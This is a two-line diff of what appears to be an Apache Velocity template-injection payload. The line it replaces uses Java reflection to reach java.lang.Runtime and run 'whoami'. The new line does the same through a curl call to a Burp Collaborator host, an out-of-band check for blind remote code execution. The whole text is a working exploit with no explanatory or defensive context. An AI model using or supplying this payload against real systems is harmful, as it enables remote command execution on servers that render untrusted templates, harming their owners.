@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("{curl gzjvnutu7w1mu95tuc3a8wj5zw5ntc.burpcollaborator.net}",null,null).toString();
